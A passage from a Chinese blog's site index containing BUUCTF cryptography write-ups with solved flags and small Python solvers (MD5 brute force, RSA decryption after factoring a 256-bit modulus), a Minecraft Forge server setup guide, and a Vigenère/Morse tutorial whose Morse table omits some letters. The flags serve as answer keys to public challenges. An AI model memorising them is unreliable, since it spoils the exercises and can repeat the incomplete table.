class="language-text">89FQA9WMD&lt;V1A&lt;V1S83DY.#&lt;W3$Q,2TM]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>题目是Unencode，我以为是Unicode，真的是误导了我，👉<a href="http://www.hiencode.com/uu.html">在线UUencode</a>。</p><p>最终flag是<code>flag&#123;dsdasdsa99877LLLKK&#125;</code></p><hr><h2 id="十一-异性相吸"><a href="#十一-异性相吸" class="headerlink" title="十一.异性相吸"></a>十一.异性相吸</h2><p>题目提示如下👇</p><blockquote><p>最近出现了一个奇葩观点，说性别都不一样，怎么能谈恋爱？为了证明这个观点错误，请大家证明异性是相吸的。 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>题目内容👇</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">key:asadsasdasdasdasdasdasdasdasdasdqwesqf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">密文:ἇ̀Ј唒ဃ塔屋䩘卖剄䐃堂ن䝔嘅均ቄ䩝ᬔ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>太奇葩了，直接上大佬文章链接</p><p><a href="https://blog.csdn.net/justruofeng/article/details/122307497">异性相吸</a></p><p>最终flag:<code>flag&#123;ea1bc0988992276b7f95b54a7435e89e&#125;</code></p><hr><h2 id="十二-AFCTF2018-Morse"><a href="#十二-AFCTF2018-Morse" class="headerlink" title="十二.[AFCTF2018]Morse"></a>十二.[AFCTF2018]Morse</h2><p>题目一看就是摩斯密码</p><p>题目内容如下</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">-..../.----/-..../-..../-..../...--/--.../....-/-..../-..../--.../-.../...--/.----/--.../...--/..---/--.../--.../....-/...../..-./--.../...--/...--/-----/...../..-./...--/...--/...--/....-/...--/...../--.../----./--.../-..<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先摩斯密码转换字符，然后在十六进制转ASCII即可，仔细摩斯👉<a href="https://www.matools.com/morse">在线摩斯</a></p><p>最终flag:<code>afctf&#123;1s&#39;t_s0_345y&#125;转换flag&#123;1s&#39;t_s0_345y&#125;</code></p><hr><h2 id="十三-还原大师"><a href="#十三-还原大师" class="headerlink" title="十三.还原大师"></a>十三.还原大师</h2><p>提示如下</p><blockquote><p>我们得到了一串神秘字符串：TASC?O3RJMV?WDJKX?ZM,问号部分是未知大写字母，为了确定这个神秘字符串，我们通过了其他途径获得了这个字串的32位MD5码。但是我们获得它的32位MD5码也是残缺不全，E903???4DAB????08?????51?80??8A?,请猜出神秘字符串的原本模样，并且提交这个字串的32位MD5码作为答案。 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>python代码跑就可以了如下👇。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token comment">#print hashlib.md5(s).hexdigest().upper()</span>k <span class="token operator">=</span> <span class="token string">'TASC?O3RJMV?WDJKX?ZM'</span>                    <span class="token comment">#要还原的明文</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>temp1 <span class="token operator">=</span> k<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">65</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>temp2 <span class="token operator">=</span> temp1<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">65</span><span class="token operator">+</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>temp3 <span class="token operator">=</span> temp2<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">65</span><span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>s <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>temp3<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#注意大小写</span><span class="token keyword">if</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'E903'</span><span class="token punctuation">:</span>    <span class="token comment">#检查元素</span><span class="token keyword">print</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span>       <span class="token comment">#输出密文</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终flag:<code>flag&#123;E9032994DABAC08080091151380478A2&#125;</code></p><hr><h2 id="十四-RSA"><a href="#十四-RSA" class="headerlink" title="十四.RSA"></a>十四.RSA</h2><p>RSA可以看这个文章👉<a href="https://blog.takagisan.top/2022/02dd678d5e.html#toc-heading-15">RSA</a>。</p><p>题目提示就是RSA然后里面的<code>pub.key</code>，就是公钥，使用网站分析👉<code>http://tool.chacuo.net/cryptrsakeyparse</code>，公钥内容，分析如下</p><table><thead><tr><th>公钥指数</th><th>摸数信息</th></tr></thead><tbody><tr><td>key长度：</td><td>256</td></tr><tr><td>模数：</td><td>C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD</td></tr><tr><td>指数：</td><td>65537 (0x10001)</td></tr></tbody></table><p>然后我们把模数转换成十进制python代码如下👇</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>所以由此可以得知</p><blockquote><p>e = 65537</p><p>n = 86934482296048119190666062003494800588905656017203025617216654058378322103517 </p></blockquote><p>可以通过网站来用n来获取q和p，👉<a href="https://www.factordb.com/">分解n</a>。</p><blockquote><p>p = 285960468890451637935629440372639283459<br>q = 304008741604601924494328155975272418463</p></blockquote><p>接下来可以使用python来解密了，代码如下，借鉴别人的(抄)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> rsae <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span>p <span class="token operator">=</span> <span class="token number">285960468890451637935629440372639283459</span>q <span class="token operator">=</span> <span class="token number">304008741604601924494328155975272418463</span>fan <span class="token operator">=</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>fan<span class="token punctuation">)</span>key <span class="token operator">=</span> rsa<span class="token punctuation">.</span>PrivateKey<span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.enc"</span><span class="token punctuation">,</span> <span class="token string">"rb+"</span><span class="token punctuation">)</span>fr <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>fr<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终flag:<code>flag&#123;decrypt_256&#125;</code>。</p><hr><h2 id="十五-RSAROLL"><a href="#十五-RSAROLL" class="headerlink" title="十五.RSAROLL"></a>十五.RSAROLL</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何搭建我的世界Mod服务器</title>
      <link href="/2022/02d7aa4d1f.html"/>
      <url>/2022/02d7aa4d1f.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近和小伙伴联合一起购买了一个服务器，打算把服务器用来整服务器联机，此文档，一步一步到搭建成功的过程，少走弯路。</p><p>这里博主是使用的是Centos系统，并且搭建的服务器版本是1.12.2，其他版本类似。</p><hr><h2 id="1-为创建服务器做准备"><a href="#1-为创建服务器做准备" class="headerlink" title="1.为创建服务器做准备"></a>1.为创建服务器做准备</h2><p>首先第一步需要创建一个文件夹，用来专门放MC的各种文件，这里选择，在根目录下面创建。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /  <span class="token comment">#切换到根目录</span><span class="token function">mkdir</span> <span class="token function">mc</span> <span class="token comment">#创建mc文件夹</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>之后需要下载一个服务器版本的forge文件，官网👉<a href="https://files.minecraftforge.net/net/minecraftforge/forge/index_1.12.2.html">forge下载地址</a>，如下图，红色箭头即可。</p><p><img src="/images/wordimage/20220209/mcforge.png" alt="forge下载"></p><p>当然，如果不想去官网，输入如下命令下载也可以👇。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> <span class="token function">mc</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://maven.minecraftforge.net/net/minecraftforge/forge/1.12.2-14.23.5.2860/forge-1.12.2-14.23.5.2860-installer.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载完毕之后，检查发现OK，如下图。</p><p><img src="/images/wordimage/20220209/okforge.png"></p><p>然后就可以安装java了，我的世界1.18.1版本或者往上需要java17版本，安装java这里不细说，需要可以看这篇文章👉<a href="https://www.jianshu.com/p/39a847aec780">Centos安装java</a>，安装ok之后，可以输入如下👇命令来检查是否安装成功，如果你和我一样，那么就是安装成功了。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost mc<span class="token punctuation">]</span><span class="token comment"># java -version</span>openjdk version <span class="token string">"1.8.0_161"</span>OpenJDK Runtime Environment <span class="token punctuation">(</span>build <span class="token number">1.8</span>.0_161-b14<span class="token punctuation">)</span>OpenJDK <span class="token number">64</span>-Bit Server VM <span class="token punctuation">(</span>build <span class="token number">25.161</span>-b14, mixed mode<span class="token punctuation">)</span><span class="token punctuation">[</span>root@localhost mc<span class="token punctuation">]</span><span class="token comment"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就是，开放MC所需端口，当然你是买的腾讯云服务器或者阿里云的服务器，可以在防火墙里面开启端口，无需输入命令即可，如果要输入命令，如下命令👇。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">firewall-cmd --zone<span class="token operator">=</span>public --add-port<span class="token operator">=</span><span class="token number">25565</span>/tcp --permanent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="2-下载文件"><a href="#2-下载文件" class="headerlink" title="2.下载文件"></a>2.下载文件</h2><p>现在可以启动在mc里面的jar文件了，输入命令如下👇。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -jar forge-1.12.2-14.23.5.2860-installer.jar nogui --installServer<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入完成之后就会下载所有文件，下载可能有点慢，需要耐心等待，如下图下载完毕。</p><p><img src="/images/wordimage/20220209/forgok.png"></p><h2 id="3-开启MC服务器"><a href="#3-开启MC服务器" class="headerlink" title="3.开启MC服务器"></a>3.开启MC服务器</h2><p>上面都弄好之后文件夹里面会有一个<code>forge-1.12.2-14.23.5.2860.jar</code>文件，我们只需要启动它即可，输入如下命令启动。</p><p>其中 <code>-Xmx</code>意思是允许使用内存的最大值，<code>-Xms</code>是允许使用内存的最小值，根据自己的需求修改即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -Xmx2048M -Xms1024M -jar forge-1.12.2-14.23.5.2860.jar nogui<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后发现会一个报错，提示<code>Failed to load eula.txt</code>，我们需要打开<code>eula.txt</code>这个文件，如下图修改即可，flase修改为true。</p><p><img src="/images/wordimage/20220209/eulaok.png"></p><p>然后在输入刚才的命令即可。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -Xmx2048M -Xms1024M -jar forge-1.12.2-14.23.5.2860.jar nogui<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图👇，服务器已经开启成功了，这个时候按道理来说已经可以进服务器了，但是这里还是要配置一下。</p><p><img src="/images/wordimage/20220209/MCserverok.png" alt="MC服务器开启成功"></p><hr><h2 id="4-配置服务器"><a href="#4-配置服务器" class="headerlink" title="4.配置服务器"></a>4.配置服务器</h2><p>在终端输入stop停止mc服务器，如下图👇</p><p><img src="/images/wordimage/20220209/stopserver.png" alt="停止MC服务器"></p><p>在我们的mc目录下面会有一个<code>server.properties</code>文件，这个文件是我的世界服务器的配置文件，里面有各种各样的参数设置，这里我做了一个调整，就是让非正版玩家可以进入服务器，如下图调整。</p><p><img src="/images/wordimage/20220209/serversetting.png"></p><p>如下是<code>server.properties</code>的所有设置的意思详解。</p><pre class="line-numbers language-tex" data-language="tex"><code class="language-tex">generator-settings&#x3D;#井号开头的内容为注释op-permission-level&#x3D;4#op权限等级 allow-nether&#x3D;true#允许末地 level-name&#x3D;world#主世界文件夹名称 enable-query&#x3D;false#是否开启GameSpy4协议服务器监听器allow-flight&#x3D;true#是否允许飞行 announce-player-achievements&#x3D;true#公布玩家成就信息 server-port&#x3D;25566#服务器端口 level-type&#x3D;DEFAULT#世界类型 enable-rcon&#x3D;false#是否开启rcon监听force-gamemode&#x3D;false#force游戏模式level-seed&#x3D;#服务器种子 server-ip&#x3D;192.168.19.32#服务器指向ipmax-build-height&#x3D;256#建筑最大高度 spawn-npcs&#x3D;false#是否有主城NPC white-list&#x3D;false#是否开启白名单 spawn-animals&#x3D;true#是否允许动物生成 hardcore&#x3D;false#是否开启极限模式snooper-enabled&#x3D;false#是否给snoop.minecraft.net网站发送服务器数据，推荐关闭online-mode&#x3D;false#是否联网游戏(非正版一定要改false) resource-pack&#x3D;#服务器资源包下载地址pvp&#x3D;true#是否开启pvp difficulty&#x3D;3#服务器难度 和平0~3困难(自行调整)enable-command-block&#x3D;true#是否开启命令方块 server-name&#x3D;Server#服务器名称 gamemode&#x3D;0#游戏模式 player-idle-timeout&#x3D;0#服务器最长挂机时间 max-players&#x3D;20#最大玩家数 spawn-monsters&#x3D;true#是否允许生成怪物 generate-structures&#x3D;true#是否生成建筑物view-distance&#x3D;10#可见距离 motd&#x3D;Server#服务器标语 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果是要安装mod，服务端和客户端一定要，使用相同的mod，在mc目录下面有一个mod文件夹，把要使用的mod返进去即可，每次上传MOD之后都要重启一下服务。</p><h2 id="5-使服务长期的运行-插件screen"><a href="#5-使服务长期的运行-插件screen" class="headerlink" title="5.使服务长期的运行(插件screen)"></a>5.使服务长期的运行(插件screen)</h2><p>每次输入完成命令之后如果是关闭或者是退出了当前的终端，服务也会被停止，因此需要的是让服务区后台运行，这里使用的是一个叫做<code>screen</code>的插件，输入如下命令安装。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> <span class="token function">screen</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装完毕之后，就可以进行一系列操作。</p><p>创建一个专门为MC服务器的窗口，比如这里我要创建一个叫做<code>mc</code>的名字的窗口，当然这个名字可以随便取，如下命令👇。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">screen</span> -S <span class="token function">mc</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>OK之后，我们在输入启动命令，也就是👇。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -Xmx2048M -Xms1024M -jar forge-1.12.2-14.23.5.2860.jar nogui<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图启动成功。</p><p><img src="/images/wordimage/20220209/screenok.png" alt="服务启动成功"></p><p>然后我们就可以按下键盘的<code>Ctrl+a+d</code>，来退出当前的窗口，服务任在运行，如果我们想要回去窗口怎么办？输入如下命令查看有多少个窗口在运行。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">screen</span> -ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，箭头所示，就是刚才我们创建的窗口。</p><p><img src="/images/wordimage/20220209/screenmc.png"></p><p>输入如下命令，配合下图操作即可回到窗口。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">screen</span> -r <span class="token number">13773</span>.mc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/20220209/backscreen.png" alt="回到窗口"></p><hr><h2 id="6-配置本地我的世界客户端"><a href="#6-配置本地我的世界客户端" class="headerlink" title="6.配置本地我的世界客户端"></a>6.配置本地我的世界客户端</h2><p>上面的操作完成之后完全可以进入服务器了，打开我的世界，在多人模式下输入ip地址，或者域名，即可进入游戏，如下图。</p><p><img src="/images/wordimage/20220209/minecraft.png"></p><p><img src="/images/wordimage/20220209/minecraftserver.png"></p><hr><h2 id="7-服务器的其他小配置"><a href="#7-服务器的其他小配置" class="headerlink" title="7.服务器的其他小配置"></a>7.服务器的其他小配置</h2><h3 id="1-更改服务器图标"><a href="#1-更改服务器图标" class="headerlink" title="1.更改服务器图标"></a>1.更改服务器图标</h3><p>找到一个图片，更改名字为<code>server-icon.png</code>放入服务器根目录即可，我这里MC服务器的根目录是/mc，我这里放入mc目录下面即可。</p><hr><h3 id="2-更改服务器标语"><a href="#2-更改服务器标语" class="headerlink" title="2.更改服务器标语"></a>2.更改服务器标语</h3><p>打开我的世界根目录下的<code>server.properties</code>文件，找到最后一行motd修改即可。</p><hr><p>参考文章</p><p><code>[1]https://xueer20.cn/</code><br><code>[2]https://blog.csdn.net/linjiayang2016/article/details/93885632</code></p>]]></content>
      
      
      <categories>
          
          <category> 游戏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 我的世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF中常见密码学(二)</title>
      <link href="/2022/02dd678d5e.html"/>
      <url>/2022/02dd678d5e.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一篇文章👉<a href="https://blog.takagisan.top/2022/027896669f.html">CTF中常见的密码学(一)</a>。</p><h2 id="一-维吉尼亚密码"><a href="#一-维吉尼亚密码" class="headerlink" title="一.维吉尼亚密码"></a>一.维吉尼亚密码</h2><h3 id="1-加密"><a href="#1-加密" class="headerlink" title="1.加密"></a>1.加密</h3><p>维吉尼亚密码就是一些偏移量不同的凯撒密码组成的，首先需要如下表。</p><table><thead><tr><th align="center">A</th><th align="center">B</th><th align="center">C</th><th>D</th><th>E</th><th>F</th><th>G</th><th>H</th><th>I</th><th>J</th><th>K</th><th>L</th><th>M</th><th>N</th><th>O</th><th>P</th><th>Q</th><th>R</th><th>S</th><th>T</th><th>U</th><th>V</th><th>W</th><th>X</th><th>Y</th><th>Z</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">1</td><td align="center">2</td><td>3</td><td>4</td><td>5</td><td>6</td><td>7</td><td>8</td><td>9</td><td>10</td><td>11</td><td>12</td><td>13</td><td>14</td><td>15</td><td>16</td><td>17</td><td>18</td><td>19</td><td>20</td><td>21</td><td>22</td><td>23</td><td>24</td><td>25</td></tr></tbody></table><p>假设密钥是<code>TAKAGISAN</code>,则对应上面👆表转换成数字密钥就是<code>key=(19,0,10,0,6,8,18,0,13)</code>。</p><p>假设明文是<code>TAKAGISAN IS THE FIRST IN THE WORLD</code>，然后按照密钥分为九个一组，密钥数字排序如果不够，可以从头开始排序，如下表操作即可，假设下面对应的索引数字为<code>a</code>，密钥数字为<code>b</code>，那么加密之后的数字<code>c</code>就是<code>(a+b)mod26</code>取余数即可，最后在按照上表对应的数字排序即可得到密文。</p><table><thead><tr><th align="center">明文</th><th align="center">T</th><th align="center">A</th><th align="center">K</th><th align="center">A</th><th align="center">G</th><th align="center">I</th><th align="center">S</th><th align="center">A</th><th align="center">N</th><th align="center">I</th><th align="center">S</th><th align="center">T</th><th>H</th><th>E</th><th align="center">F</th><th align="center">I</th><th align="center">R</th><th align="center">S</th><th align="center">T</th><th align="center">I</th><th align="center">N</th><th align="center">T</th><th align="center">H</th><th align="center">E</th><th align="center">W</th><th align="center">O</th><th align="center">R</th><th align="center">L</th><th align="center">D</th></tr></thead><tbody><tr><td align="center">对应的索引数字</td><td align="center">19</td><td align="center">0</td><td align="center">10</td><td align="center">0</td><td align="center">6</td><td align="center">8</td><td align="center">18</td><td align="center">0</td><td align="center">13</td><td align="center">8</td><td align="center">18</td><td align="center">19</td><td>7</td><td>4</td><td align="center">5</td><td align="center">8</td><td align="center">17</td><td align="center">18</td><td align="center">19</td><td align="center">8</td><td align="center">13</td><td align="center">19</td><td align="center">7</td><td align="center">4</td><td align="center">22</td><td align="center">14</td><td align="center">17</td><td align="center">11</td><td align="center">3</td></tr><tr><td align="center">密钥数字</td><td align="center">19</td><td align="center">0</td><td align="center">10</td><td align="center">0</td><td align="center">6</td><td align="center">8</td><td align="center">18</td><td align="center">0</td><td align="center">13</td><td align="center">19</td><td align="center">0</td><td align="center">10</td><td>0</td><td>6</td><td align="center">8</td><td align="center">18</td><td align="center">0</td><td align="center">13</td><td align="center">19</td><td align="center">0</td><td align="center">10</td><td align="center">0</td><td align="center">6</td><td align="center">8</td><td align="center">18</td><td align="center">0</td><td align="center">13</td><td align="center">19</td><td align="center">0</td></tr><tr><td align="center">加密之后的数字</td><td align="center">12</td><td align="center">0</td><td align="center">20</td><td align="center">0</td><td align="center">12</td><td align="center">16</td><td align="center">10</td><td align="center">0</td><td align="center">0</td><td align="center">1</td><td align="center">18</td><td align="center">3</td><td>7</td><td>10</td><td align="center">13</td><td align="center">0</td><td align="center">17</td><td align="center">5</td><td align="center">12</td><td align="center">8</td><td align="center">23</td><td align="center">19</td><td align="center">13</td><td align="center">12</td><td align="center">14</td><td align="center">14</td><td align="center">4</td><td align="center">4</td><td align="center">3</td></tr><tr><td align="center">密文</td><td align="center">M</td><td align="center">A</td><td align="center">U</td><td align="center">A</td><td align="center">M</td><td align="center">Q</td><td align="center">K</td><td align="center">A</td><td align="center">A</td><td align="center">B</td><td align="center">S</td><td align="center">D</td><td>H</td><td>K</td><td align="center">N</td><td align="center">A</td><td align="center">R</td><td align="center">F</td><td align="center">M</td><td align="center">I</td><td align="center">X</td><td align="center">T</td><td align="center">N</td><td align="center">M</td><td align="center">O</td><td align="center">O</td><td align="center">E</td><td align="center">E</td><td align="center">D</td></tr></tbody></table><p>所以<code>TAKAGISAN IS THE FIRST IN THE WORLD</code>加密之后的密文是<code>MAUAMQKAABSDHKNARFMIXTNMOOEED</code>。公式就是<code>(a+b)mod26=c</code>。</p><hr><h3 id="2-解密"><a href="#2-解密" class="headerlink" title="2.解密"></a>2.解密</h3><p>假设已经知道了密钥是<code>TAKAGISAN</code>密钥是<code>key=(19,0,10,0,6,8,18,0,13)</code>，公式是<code>(c-b)mod26=a</code>，也就是对应的索引数字减去密钥数字再来mod26即可，如下表。</p><table><thead><tr><th align="center">密文</th><th align="center">M</th><th align="center">A</th><th align="center">U</th><th align="center">A</th><th align="center">M</th><th>Q</th><th>K</th><th>A</th><th>A</th><th>B</th><th>S</th><th>D</th><th>H</th><th>K</th><th>N</th><th>A</th><th>R</th><th>F</th><th>M</th><th>I</th><th>X</th><th>T</th><th>N</th><th>M</th><th>O</th><th>O</th><th>E</th><th>E</th><th>D</th></tr></thead><tbody><tr><td align="center">对应的索引数字</td><td align="center">12</td><td align="center">0</td><td align="center">20</td><td align="center">0</td><td align="center">12</td><td>16</td><td>10</td><td>0</td><td>0</td><td>1</td><td>18</td><td>3</td><td>7</td><td>10</td><td>13</td><td>0</td><td>17</td><td>5</td><td>12</td><td>8</td><td>23</td><td>19</td><td>13</td><td>12</td><td>14</td><td>14</td><td>4</td><td>4</td><td>3</td></tr><tr><td align="center">密钥数字</td><td align="center">19</td><td align="center">0</td><td align="center">10</td><td align="center">0</td><td align="center">6</td><td>8</td><td>18</td><td>0</td><td>13</td><td>19</td><td>0</td><td>10</td><td>0</td><td>6</td><td>8</td><td>18</td><td>0</td><td>13</td><td>19</td><td>0</td><td>10</td><td>0</td><td>6</td><td>8</td><td>18</td><td>0</td><td>13</td><td>19</td><td>0</td></tr><tr><td align="center">解密之后的数字</td><td align="center">19</td><td align="center">0</td><td align="center">10</td><td align="center">0</td><td align="center">6</td><td>8</td><td>18</td><td>0</td><td>13</td><td>8</td><td>18</td><td>19</td><td>7</td><td>4</td><td>5</td><td>8</td><td>17</td><td>18</td><td>19</td><td>8</td><td>13</td><td>19</td><td>7</td><td>4</td><td>22</td><td>14</td><td>17</td><td>11</td><td>3</td></tr><tr><td align="center">明文</td><td align="center">T</td><td align="center">A</td><td align="center">K</td><td align="center">A</td><td align="center">G</td><td>I</td><td>S</td><td>A</td><td>N</td><td>I</td><td>S</td><td>T</td><td>H</td><td>E</td><td>F</td><td>I</td><td>R</td><td>S</td><td>T</td><td>I</td><td>N</td><td>T</td><td>H</td><td>E</td><td>W</td><td>O</td><td>R</td><td>L</td><td>D</td></tr></tbody></table><hr><h2 id="二-摩斯电码"><a href="#二-摩斯电码" class="headerlink" title="二.摩斯电码"></a>二.摩斯电码</h2><p>当然也是字符对应字母，如下表</p><p>字母表</p><table><thead><tr><th align="center">字符</th><th align="center">电码符号</th><th align="center">字符</th><th align="center">电码符号</th><th align="center">字符</th><th align="center">电码符号</th><th align="center">字符</th><th align="center">电码符号</th></tr></thead><tbody><tr><td align="center">A</td><td align="center">.-</td><td align="center">B</td><td align="center">-…</td><td align="center">C</td><td align="center">-.-.</td><td align="center">D</td><td align="center">-..</td></tr><tr><td align="center">E</td><td align="center">.</td><td align="center">F</td><td align="center">..-.</td><td align="center">G</td><td align="center">–.</td><td align="center">H</td><td align="center">….</td></tr><tr><td align="center">I</td><td align="center">..</td><td align="center">J</td><td align="center">.—</td><td align="center">K</td><td align="center">-.-</td><td align="center">L</td><td align="center">.-..</td></tr><tr><td align="center">M</td><td align="center">–</td><td align="center">N</td><td align="center">-.</td><td align="center">O</td><td align="center">—</td><td align="center">P</td><td align="center">.–.</td></tr><tr><td align="center">U</td><td align="center">..-</td><td align="center">V</td><td align="center">…-</td><td align="center">W</td><td align="center">.–</td><td align="center">X</td><td align="center">-..-</td></tr><tr><td align="center">Y</td><td align="center">-.–</td><td align="center">Z</td><td align="center">–..</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><p>标点符号</p><table><thead><tr><th align="center">字符</th><th align="center">电码符号</th><th align="center">字符</th><th align="center">电码符号</th><th align="center">字符</th><th align="center">电码符号</th><th align="center">字符</th><th align="center">电码符号</th></tr></thead><tbody><tr><td align="center">.</td><td align="center">.-.-.-</td><td align="center">:</td><td align="center">—…</td><td align="center">,</td><td align="center">–..–</td><td align="center">;</td><td align="center">-.-.-.</td></tr><tr><td align="center">?</td><td align="center">..–..</td><td align="center">=</td><td align="center">-…-</td><td align="center">‘</td><td align="center">.—-</td><td align="center">/</td><td align="center">-..-.</td></tr><tr><td align="center">!</td><td align="center">-.-.–</td><td align="center">-</td><td align="center">-….-</td><td align="center">-</td><td align="center">..–.-</td><td 